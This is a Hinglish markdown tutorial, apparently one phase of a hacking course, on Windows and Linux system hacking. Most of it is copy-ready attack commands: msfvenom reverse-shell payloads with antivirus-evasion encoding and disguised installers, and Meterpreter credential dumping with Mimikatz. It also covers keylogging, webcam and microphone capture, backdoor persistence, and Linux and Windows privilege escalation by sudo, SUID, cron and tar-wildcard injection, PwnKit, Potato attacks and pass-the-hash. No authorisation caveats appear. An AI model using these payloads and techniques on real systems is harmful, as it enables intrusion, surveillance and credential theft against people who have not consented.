# 💻 Phase 5 — System Hacking: Windows & Linux Exploitation

> System level access = full control. Yahan tu seekhega kaise initial access lena hai,
> privileges escalate karna hai, aur system pe persistence maintain karna hai.

---

## 🎯 Metasploit Mastery

### Payload Generation with msfvenom

```bash
# ═══════════════════════════════════════════════
# WINDOWS PAYLOADS
# ═══════════════════════════════════════════════
# Reverse shell EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o shell.exe

# Encoded (basic AV evasion)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# DLL injection payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f dll -o malicious.dll

# PowerShell payload (fileless — no file touches disk!)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f psh -o shell.ps1
# Victim runs: powershell -ep bypass -f shell.ps1

# HTA payload (opens in browser!)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f hta-psh -o evil.hta

# MSI installer payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f msi -o setup.msi

# ═══════════════════════════════════════════════
# LINUX PAYLOADS
# ═══════════════════════════════════════════════
# ELF binary
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o shell.elf

# Python payload
msfvenom -p python/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw -o shell.py

# ═══════════════════════════════════════════════
# CROSS-PLATFORM
# ═══════════════════════════════════════════════
# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw -o shell.php

# Java JAR
msfvenom -p java/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f jar -o shell.jar

# Python one-liner (paste anywhere Python runs)
msfvenom -p python/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw

# ═══════════════════════════════════════════════
# HANDLER (Run this BEFORE sending payload!)
# ═══════════════════════════════════════════════
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT 4444
exploit -j     # run in background
```

### Post-Exploitation with Meterpreter

```bash
# ═══════════════════════════════════════════════
# ONCE YOU HAVE A METERPRETER SESSION:
# ═══════════════════════════════════════════════

# SYSTEM INFO
sysinfo                          # OS details
getuid                           # current user
getpid                           # current process

# ESCALATE PRIVILEGES
getsystem                        # try auto priv esc
run post/multi/recon/local_exploit_suggester   # suggest exploits

# CREDENTIAL HARVESTING
hashdump                         # dump password hashes (SAM)
load kiwi                        # load Mimikatz!
creds_all                        # ALL credentials in memory!
creds_wdigest                    # WDigest plaintext passwords
kiwi_cmd sekurlsa::logonPasswords  # Mimikatz command

# SCREENSHOT & SURVEILLANCE
screenshot                       # take screenshot
screenshare                      # live screen view!
webcam_list                      # list cameras
webcam_snap                      # take photo from webcam
webcam_stream                    # live webcam stream
record_mic -d 30                 # record microphone 30 seconds
keyscan_start                    # start keylogger
keyscan_dump                     # show captured keys
keyscan_stop                     # stop keylogger

# FILE OPERATIONS
download "C:\\Users\\Admin\\Desktop\\passwords.txt"   # download file
upload backdoor.exe "C:\\Windows\\Temp\\update.exe"    # upload file
search -f "*.docx"               # search for files
search -f "password*"            # search for password files

# NETWORK
ipconfig                         # interfaces
route                            # routing table
arp                              # ARP table
portfwd add -l 3389 -p 3389 -r 192.168.1.100  # port forward RDP

# PERSISTENCE
run persistence -U -i 30 -p 4444 -r YOUR_IP   # auto-start backdoor
run post/windows/manage/enable_rdp              # enable RDP

# PIVOTING (Attack other machines through this one)
run autoroute -s 10.0.0.0/24                   # add internal route
background
use auxiliary/server/socks_proxy               # SOCKS proxy
set SRVHOST 127.0.0.1
run
# Now use proxychains to access internal network!
```

---

## ⬆️ Privilege Escalation — Linux

### Automated Enumeration

```bash
# ═══════════════════════════════════════════════
# LinPEAS — THE BEST Linux priv esc tool
# ═══════════════════════════════════════════════
# Transfer to target:
# On your machine:
python3 -m http.server 8000
# On target:
wget http://YOUR_IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt

# Color coding:
# 🔴 RED/YELLOW = HIGH probability priv esc vector
# 🟢 GREEN = Interesting but not directly exploitable
# 🔵 BLUE = Info

# ═══════════════════════════════════════════════
# Linux Smart Enumeration (LSE)
# ═══════════════════════════════════════════════
wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
chmod +x lse.sh
./lse.sh -l 2                    # verbosity level 2
```

### Manual Priv Esc Techniques

```bash
# ═══════════════════════════════════════════════
# 1. SUDO ABUSE (Most common!)
# ═══════════════════════════════════════════════
sudo -l                          # CHECK THIS FIRST!

# If you see: (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c '!bash'

# If: (ALL) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import os; os.system("/bin/bash")'

# If: (ALL) NOPASSWD: /usr/bin/find  
sudo find . -exec /bin/bash \; -quit

# If: (ALL) NOPASSWD: /usr/bin/awk
sudo awk 'BEGIN {system("/bin/bash")}'

# If: (ALL) NOPASSWD: /usr/bin/less
sudo less /etc/passwd
# Type: !bash

# If: (ALL) NOPASSWD: /usr/bin/nano
sudo nano
# Ctrl+R, Ctrl+X → command to execute → /bin/bash

# If: (ALL) NOPASSWD: /usr/bin/env
sudo env /bin/bash

# If: (ALL) NOPASSWD: /usr/bin/perl
sudo perl -e 'exec "/bin/bash"'

# ══ CHECK GTFOBins FOR ANY BINARY! ══
# https://gtfobins.github.io/

# ═══════════════════════════════════════════════
# 2. SUID EXPLOITATION
# ═══════════════════════════════════════════════
find / -perm -4000 -type f 2>/dev/null

# Common exploitable SUID binaries:
# /usr/bin/python3 → python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# /usr/bin/find → find . -exec /bin/bash -p \; -quit
# /usr/bin/nmap (old) → nmap --interactive → !sh
# /usr/bin/cp → copy /etc/passwd, add root user, copy back
# /usr/bin/bash → bash -p

# ═══════════════════════════════════════════════
# 3. CRON JOB EXPLOITATION
# ═══════════════════════════════════════════════
cat /etc/crontab                 # system cron jobs
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
crontab -l                       # user cron jobs

# Use pspy to monitor running processes/crons:
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64

# If cron runs a writable script:
echo 'chmod +s /bin/bash' >> /path/to/cron_script.sh
# Wait... then: bash -p = ROOT!

# If cron uses wildcard:
# Cron: tar czf /tmp/backup.tar.gz *
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=bash reverse.sh"

# ═══════════════════════════════════════════════
# 4. KERNEL EXPLOITS
# ═══════════════════════════════════════════════
uname -r                         # kernel version
cat /etc/os-release

# Use linux-exploit-suggester
./linux-exploit-suggester.sh

# Famous exploits:
# DirtyCow (CVE-2016-5195) → Linux < 4.8.3
# DirtyPipe (CVE-2022-0847) → Linux 5.8 - 5.16.11  
# PwnKit (CVE-2021-4034) → Polkit pkexec (almost universal!)
# GameOver(lay) (CVE-2023-2640) → Ubuntu overlayfs

# PwnKit (works on most Linux!)
# Download: https://github.com/ly4k/PwnKit
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x PwnKit
./PwnKit    # INSTANT ROOT!

# ═══════════════════════════════════════════════
# 5. CAPABILITIES
# ═══════════════════════════════════════════════
getcap -r / 2>/dev/null

# python3 with cap_setuid:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Check GTFOBins for each capability!
```

---

## ⬆️ Privilege Escalation — Windows

```powershell
# ═══════════════════════════════════════════════
# ENUMERATION
# ═══════════════════════════════════════════════
whoami /all                      # CRITICAL — check privileges!
systeminfo                       # OS version, hotfixes
net user                         # all users
net localgroup administrators    # admin group members
netstat -ano                     # network connections
wmic service list brief          # running services

# ═══════════════════════════════════════════════
# WINPEAS (Automated)
# ═══════════════════════════════════════════════
# Download winPEASx64.exe and transfer to target
.\winPEASx64.exe

# ═══════════════════════════════════════════════
# POWERUP (PowerShell)
# ═══════════════════════════════════════════════
powershell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# ═══════════════════════════════════════════════
# COMMON WINDOWS PRIV ESC
# ═══════════════════════════════════════════════

# 1. Unquoted Service Paths
wmic service get name,pathname | findstr /i "auto" | findstr /i /v "C:\Windows"
# If path is: C:\Program Files\My App\service.exe
# Create: C:\Program Files\My.exe (your payload!)

# 2. AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1, you can install MSI as SYSTEM!
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi -o exploit.msi
msiexec /quiet /qn /i exploit.msi

# 3. Token Impersonation (Potato attacks)
# If you have SeImpersonatePrivilege:
# Use PrintSpoofer, JuicyPotato, GodPotato, or SweetPotato
.\PrintSpoofer.exe -i -c cmd
.\GodPotato.exe -cmd "cmd /c whoami"

# 4. Pass the Hash
# With captured NTLM hash:
impacket-psexec administrator@TARGET -hashes :NTLM_HASH
impacket-wmiexec administrator@TARGET -hashes :NTLM_HASH
evil-winrm -i TARGET -u administrator -H NTLM_HASH

# 5. Credential Search
findstr /spin "password" *.txt *.ini *.config *.xml *.cfg
reg query HKLM /f password /t REG_SZ /s
cmdkey /list                     # stored credentials
```

---

## 🎥 Phase 5 Videos

```
1. "Linux Privilege Escalation" — TCM Security (FREE, 3+ hours)
   https://www.youtube.com/watch?v=ZTnwg3qCdVM

2. "Windows Privilege Escalation" — TCM Security (FREE, 3+ hours)
   https://www.youtube.com/watch?v=uTcrbNBcoxQ

3. "Metasploit Unleashed" — Offensive Security (FREE course!)
   https://www.offsec.com/metasploit-unleashed/

4. "Active Directory Hacking" — TCM Security
   https://www.youtube.com/watch?v=VXxH4n684HE

5. "Mimikatz Tutorial" — David Bombal
   https://www.youtube.com/watch?v=gV2sVOil9jU

6. "Meterpreter Deep Dive" — HackerSploit
   https://www.youtube.com/watch?v=gfRKiZ3J0xM
```

---

## ✅ Phase 5 Checklist

```
PAYLOADS
[ ] Can generate payloads for Windows, Linux, PHP, Python
[ ] Can set up multi/handler listener
[ ] Know difference between staged vs stageless payloads

METERPRETER
[ ] Can dump credentials (hashdump, kiwi)
[ ] Can capture screenshots, keystrokes, webcam
[ ] Can pivot through compromised machines
[ ] Can set up persistence

LINUX PRIV ESC
[ ] Always check sudo -l FIRST
[ ] Can exploit SUID binaries with GTFOBins
[ ] Can exploit cron jobs
[ ] Know major kernel exploits (PwnKit, DirtyPipe)
[ ] Can use LinPEAS

WINDOWS PRIV ESC
[ ] Can enumerate with winPEAS/PowerUp
[ ] Know token impersonation (Potato attacks)
[ ] Can find stored credentials
[ ] Can pass the hash
```

---

> **Phase 5 done? → [Phase 6 — USB & Physical Attacks](./Phase6_USB_Physical.md)** 🔌
